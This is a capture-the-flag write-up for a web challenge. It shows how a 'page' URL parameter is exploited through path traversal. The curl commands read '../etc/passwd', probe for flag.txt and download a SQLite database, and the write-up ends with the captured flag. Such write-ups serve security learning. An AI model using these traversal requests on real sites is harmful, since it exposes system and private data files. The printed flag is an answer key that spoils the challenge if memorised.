# Talk To You &mdash; Solution

## Index page

On the index page, we see some links to travel the page.
If we click on some of the links, we get URLs like:
`https://tbtl-talk-to-you.chals.io/?page=offer.html#content`

## Path traversal

We can assume that `page=something` is vulnerable to the path traversal.
So we can do that, and at first sight, nothing happened.

## Analyse the page

If we are careful and run
`curl https://tbtl-talk-to-you.chals.io/?page=something.html,`
we can see an interesting new line in the source code: `window.location.href = 'index.php';.`

So, the conclusion is that if we try to make a path-traversal attack, we get redirected.

## Attack

The first and standard try is to check `curl https://tbtl-talk-to-you.chals.io/?page=../etc/passwd,`
Moreover, this is successful.

## Find the Flag

We can try multiple guesses, and one is to check `../flag.txt` and partial success:
We found this line: `<p style="color: rgba(0, 0, 0, 0)">Flag is in SQLite3: database.sqlite</p>`

However, now is easy:

`curl --output - https://tbtl-talk-to-you.chals.io/?page=database.sqlite`, and we
got the flag: `TBTL{4Typ1c41_d4T4B453_u54g3}`
